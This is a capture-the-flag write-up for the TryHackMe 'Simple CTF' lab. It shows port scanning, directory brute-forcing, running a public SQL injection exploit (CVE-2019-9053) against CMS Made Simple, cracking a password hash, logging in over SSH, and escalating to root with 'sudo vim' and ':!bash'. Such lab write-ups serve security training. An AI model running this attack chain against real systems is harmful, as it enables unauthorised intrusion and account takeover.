# TryHackMe: Simple CTF Write-Up

## Nmap Scan

I began by running an Nmap scan to identify open ports and services on the target machine.
```bash
nmap -sV 10.10.2.131
```

![Nmap Scan](https://raw.githubusercontent.com/Anjai7/Tryhackme_CTF/main/nmap.png)

The scan revealed that FTP, HTTP, and SSH services were running.

## Initial Web Exploration

I visited the website, but initially, nothing significant was found.

### Gobuster Directory Bruteforce

Next, I performed a Gobuster directory brute force attack:
```bash
gobuster dir -u http://10.10.2.131/ -w common.txt
```

![Gobuster Output](https://raw.githubusercontent.com/Anjai7/Tryhackme_CTF/main/gobuster.png)

This led me to the path [http://10.10.2.131/simple/](http://10.10.2.131/simple/), where I discovered that the website was running CMS Made Simple version 2.2.8. This information was hinted at by the "hints" button on the TryHackMe page.

![CMS Made Simple Version](https://raw.githubusercontent.com/Anjai7/Tryhackme_CTF/main/website.png)

## Exploit Search

I used SearchSploit to find a relevant exploit and found a SQL injection vulnerability.
```bash
searchexploit cms made simple
```

![SearchSploit Results](https://github.com/Anjai7/Tryhackme_CTF/blob/main/exploit.png)
## Exploit Execution

The initial exploit was written in Python2. I searched for a Python3 version and found it on GitHub:

- [Python3 Exploit Script](https://github.com/Jason-Siu/CVE-2019-9053-Exploit-in-Python-3/blob/main/46635.py)

I integrated this script with the original exploit and executed it. The process took about 10-15 minutes.(also had the hint in try hack me to use this word list)
```bash
python3 /usr/share/exploitdb/exploits/php/webapps/46635.py -u http://10.10.2.131/simple/ -w /opt/SecLists/Passwords/Common-Credentials/best110.txt
```

![Exploit Execution](https://github.com/Anjai7/Tryhackme_CTF/blob/main/credentials.png)

## Cracking the Password Hash

The exploit provided a salt and password hash, which I used with Hashcat to crack the password.

![Hashcat Output](https://raw.githubusercontent.com/Anjai7/Tryhackme_CTF/main/hashcracking.png)

## SSH Access

Using the cracked password, I connected via SSH:

```bash
ssh mitch@10.10.2.131 -p 2222
```
![SSH Access](https://github.com/Anjai7/Tryhackme_CTF/blob/main/ssh.png)

## Finding User
Navigate to home dirctory and use ls
```bash
cd /home/
ls
```
![User](https://github.com/Anjai7/Tryhackme_CTF/blob/main/user.png)

## Previlage Execution
Unable to spawn a privileged shell through my initial attempts, I consulted other write-ups and discovered that leveraging vim with sudo permissions could be used for privilege escalation.
```bash
sudo vim
```
```bash
:!bash
```
[!Previlage](https://github.com/Anjai7/Tryhackme_CTF/blob/main/previlage.png)
![Root](https://github.com/Anjai7/Tryhackme_CTF/blob/main/root.png)
